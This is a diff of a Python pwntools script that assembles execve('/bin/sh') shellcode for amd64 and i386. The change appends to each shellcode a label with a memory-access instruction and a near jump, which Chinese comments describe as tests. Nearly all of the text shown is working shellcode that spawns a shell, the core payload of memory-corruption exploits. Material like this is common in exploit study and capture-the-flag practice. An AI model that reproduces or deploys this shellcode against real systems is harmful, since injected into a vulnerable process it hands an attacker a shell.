@@ -298,7 +298,12 @@ xor	edx, edx	/*edx -> NULL*/
 push	0x3b
 pop	rax		/*rax = 0x3b*/
 syscall			/*execve("/bin/sh")*/
-'''%(u64('/bin/sh'.ljust(8, '\x00'))))
+
+label1:
+mov	rax, [rsp + %d]	/* 测试内存访问 */
+cmp	rax, 1
+je	label1		/* 测试近跳	*/
+'''%(u64('/bin/sh'.ljust(8, '\x00')), 1))
 elif context.arch == 'i386':
 	shellcode = asm('''
 push	%d		/*"/bin"*/
@@ -309,7 +314,12 @@ xor	edx, edx	/*edx -> NULL*/
 push	11
 pop	eax		/*eax = 11*/
 int 0x80		/*execve("/bin/sh")*/
-'''%(u32('/bin'), u32('/sh\x00')))
+
+label1:
+mov	eax, [esp + %d]	/* 测试内存访问 */
+cmp	eax, 1
+je	label1		/* 测试近跳	*/
+'''%(u32('/bin'), u32('/sh\x00'), 1))
 
 
 
